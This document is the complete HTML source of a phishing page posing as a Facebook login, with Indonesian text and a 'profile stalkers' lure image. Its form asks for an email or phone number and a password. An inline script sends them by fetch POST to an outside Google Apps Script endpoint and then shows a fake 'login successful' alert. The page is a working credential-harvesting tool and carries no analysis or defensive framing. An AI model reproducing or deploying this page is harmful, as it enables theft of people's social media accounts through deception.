<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>facebook</title>
  </head>
  <body>
<div class="container-fluid">
    <img src="https://t-2.tstatic.net/medan/foto/bank/images/cara-mudah-mengetahui-siapa-suka-intip-facebook-dan-instagram-anda-ini-aplikasi-profile-stalkers.jpg" class="img-fluid" alt="...">
    <div class="alert alert-danger" role="alert">
      login dengan facebook!
    </div>
  </div>
    

      <div class="container">
        <p class="text-center text-primary" style="font-size:40px;"><strong>Facebook</strong> </p>
      </div>
      <div class="container">
        <div class="col-lg-8 mt-5 mt-lg-0">
          <div class="alert alert-warning alert-dismissible fade show d-none my-alert" role="alert">
            <strong>login..</strong> berhasil.
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
          </div>
      <form name="piface">
        <div class="mb-3">
          <label for="exampleInputEmail1" class="form-label"></label>
          <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp"placeholder="Email atau no hp" name="username" required>
         
        </div>
        <div class="mb-3">
          <label for="exampleInputPassword1" class="form-label"></label>
          <input type="password" class="form-control" id="exampleInputPassword1"placeholder="Password" name="password" required>
        </div>
       
        <button type="submit" class="btn btn-primary w-100 btn-kirim" href="https://www.facebook.com/" target="_blank">Masuk </button>
        <button class="btn btn-primary btn-loading d-none" type="button" disabled>
          <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
            Loading...
        </button>
      </form>
    </div><br>

    <p class="text-center">Atau</p>

    <div class="container text-center">
      <button class="btn btn-success">Buat Akun Baru</button>
    </div>
   


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbxkXNOCJlWDirYQwQ2ksL6q2cEiFZ1xhgLsa67JTiuIRiaV3MT_tWWi6AzZI5haCZss1g/exec'
      const form = document.forms['piface']
      const btnKirim = document.querySelector('.btn-kirim');
      const btnLoading = document.querySelector('.btn-loading');
      const myAlert = document.querySelector('.my-alert');
    
      form.addEventListener('submit', e => {
        e.preventDefault()
        btnLoading.classList.toggle('d-none');
        btnKirim.classList.toggle('d-none');
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => {
        btnLoading.classList.toggle('d-none');
        btnKirim.classList.toggle('d-none');
        myAlert.classList.toggle('d-none');
        form.reset();
        console.log('Success!', response)
      })
          .catch(error => console.error('Error!', error.message))
      })
    </script>
   </body>
</html>
